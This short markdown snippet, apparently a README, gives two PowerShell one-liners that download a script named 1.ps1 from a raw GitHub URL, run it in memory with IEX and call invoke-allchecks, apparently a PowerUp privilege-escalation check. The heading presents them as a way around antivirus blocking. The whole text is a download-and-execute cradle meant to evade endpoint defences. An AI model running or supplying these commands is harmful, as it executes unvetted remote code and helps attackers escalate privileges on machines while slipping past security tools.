## Sometimes AV will block the normal script, just try this command
### Run command
```
iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/f3ci/powerup/master/1.ps1"); invoke-allchecks
```
OR
```
$a = [System.Net.WebRequest]::Create('https://raw.githubusercontent.com/f3ci/powerup/master/1.ps1');$b=$a.GetResponse();$c=$b.GetResponseStream();$d=[System.IO.StreamReader]::new($c);$content=$d.ReadToEnd();IEX($content);invoke-allchecks
```
